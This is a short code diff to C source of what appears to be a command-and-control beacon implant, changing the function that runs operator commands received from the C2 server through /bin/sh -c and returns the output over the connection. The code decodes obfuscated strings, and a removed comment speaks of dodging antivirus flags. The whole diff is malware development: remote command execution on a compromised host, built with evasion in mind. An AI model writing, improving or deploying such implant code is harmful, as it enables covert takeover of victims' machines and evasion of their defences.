@@ -520,24 +520,15 @@ int _beacon_commands_exec(char *data, int connID, int *payloadEncoderID) {
     }
 
     procPID = fork();
+    char *cmd = decodeMacro(BIN_SH_PATH, payloadEncoderID);
     if (procPID < 0) {
         char *failMessage = decodeMacro(REQUEST_FROM_C2_FAILED, payloadEncoderID);
         Send(connID, failMessage, strlen(failMessage));
         FreeGoMem(failMessage);
         return 0;
 
-    } else if (procPID == 0) { // The following block looks complex and it's complex hahaha, i take 3 hours to do that s**t D:<
-        char *cmd = decodeMacro(BIN_SH_PATH, payloadEncoderID);
-        char *_tmp_array1[] = {cmd, "-c"}; // No way that "-c" hardcoded will result in AV Flags, it's just 2 chars
-        int _tmp_array1Len = sizeof(_tmp_array1) / sizeof(_tmp_array1[0]);
-
-        int _dataArrayLen;
-        char _dataArrayDelim = ' ';
-        char **_dataArray = splitStr(data, _dataArrayDelim, &_dataArrayLen);
-
-        char **_cmdArgsRaw = mergeStrArrays(_tmp_array1, _tmp_array1Len, _dataArray, _dataArrayLen);
-        char *_cmdArgsTerminator[] = {NULL};
-        char **cmdArgs = mergeStrArrays(_cmdArgsRaw, _tmp_array1Len + _dataArrayLen, _cmdArgsTerminator, 1);
+    } else if (procPID == 0) {
+        char *cmdArgs[] = {cmd, "-c", data, NULL};
 
         // Redirect stdout/err
         dup2(pipeOut[1], STDOUT_FILENO);
